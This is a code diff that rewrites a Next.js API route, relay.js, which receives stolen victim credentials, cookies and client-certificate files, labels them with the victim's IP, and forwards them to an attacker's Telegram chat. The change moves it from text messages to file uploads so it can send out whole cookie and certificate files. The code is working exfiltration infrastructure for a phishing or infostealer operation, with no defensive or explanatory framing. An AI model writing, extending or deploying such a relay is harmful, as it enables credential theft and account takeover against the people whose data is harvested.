@@ -1,56 +1,69 @@
 // pages/api/relay.js
-export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
+import multer from "multer";
+import nextConnect from "next-connect";
+
+const upload = multer(); // for multipart/form-data
+
+const handler = nextConnect();
+
+// parse JSON bodies & form-data
+handler.use(upload.single("file"));
+handler.use((req, res, next) => {
+  // express.json & urlencoded equivalents
+  if (req.headers["content-type"]?.includes("application/json")) {
+    let buf = "";
+    req.on("data", chunk => buf += chunk);
+    req.on("end", () => {
+      req.body = JSON.parse(buf);
+      next();
+    });
+  } else {
+    next();
   }
+});
 
-  const payload = req.body;
-  const ip      = payload.ip || 'unknown';
+handler.post(async (req, res) => {
+  const { ip, type } = req.body;
 
-  // Telegram bot config (move to env!)
   const telegramToken = process.env.TELEGRAM_TOKEN;
   const chatId        = process.env.TELEGRAM_CHAT_ID;
-  const apiUrl        = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+  const apiUrl        = `https://api.telegram.org/bot${telegramToken}/sendDocument`;
 
-  let text;
+  // Build a FormData for Telegram sendDocument
+  const tgForm = new FormData();
+  tgForm.append("chat_id", chatId);
 
-  // 1) Credentials
-  if (payload.type === 'creds') {
-    text = `🔑 Credentials from ${ip}:\nUser: ${payload.user}\nPass: ${payload.pass}`;
-  }
-  // 2) Cookies
-  else if (payload.type === 'cookies') {
-    text = `🍪 Cookies from ${ip}:\n` +
-           payload.cookies.map(c => `• ${c}`).join("\n");
-  }
-  // 3) Cert
-  else if (payload.type === 'cert') {
-    text =
-      `🎫 Client Cert from ${ip}:\n` +
-      `• Subject: ${payload.subject}\n` +
-      `• Issuer: ${payload.issuer}\n` +
-      `• Fingerprint: ${payload.fingerprint}`;
-  }
-  else {
-    console.warn("relay.js: unknown payload:", payload);
-    return res.status(400).json({ success: false, message: 'Bad payload' });
+  if (type === "creds") {
+    // credentials still come as JSON body
+    const { user, pass } = req.body;
+    const text = `🔑 Credentials from ${ip}:\nUser: ${user}\nPass: ${pass}`;
+    tgForm.append("document", new Blob([text], {type:"text/plain"}), `${ip}-CREDS.txt`);
+  } else if (type === "cookie-file" && req.file) {
+    // file was uploaded under field "file"
+    tgForm.append("document", req.file.buffer, req.file.originalname);
+  } else if (type === "cert-file" && req.file) {
+    tgForm.append("document", req.file.buffer, req.file.originalname);
+  } else {
+    return res.status(400).json({success:false, message:"Bad payload"});
   }
 
   // send to Telegram
-  try {
-    const tgRes = await fetch(apiUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text })
-    });
-    if (!tgRes.ok) {
-      const errText = await tgRes.text();
-      console.error("Telegram API error:", errText);
-      return res.status(502).json({ success: false, message: 'Telegram API error', details: errText });
-    }
-    return res.status(200).json({ success: true });
-  } catch (err) {
-    console.error("relay.js error:", err);
-    return res.status(500).json({ success: false, message: 'Internal Error', error: err.message });
+  const tgRes = await fetch(apiUrl, {
+    method: "POST",
+    body: tgForm
+  });
+
+  if (!tgRes.ok) {
+    const err = await tgRes.text();
+    console.error("Telegram sendDocument error:", err);
+    return res.status(502).json({success:false, message:"Telegram error", details:err});
   }
-}
+
+  res.status(200).json({success:true});
+});
+
+export default handler;
+
+export const config = {
+  api: { bodyParser: false }
+};
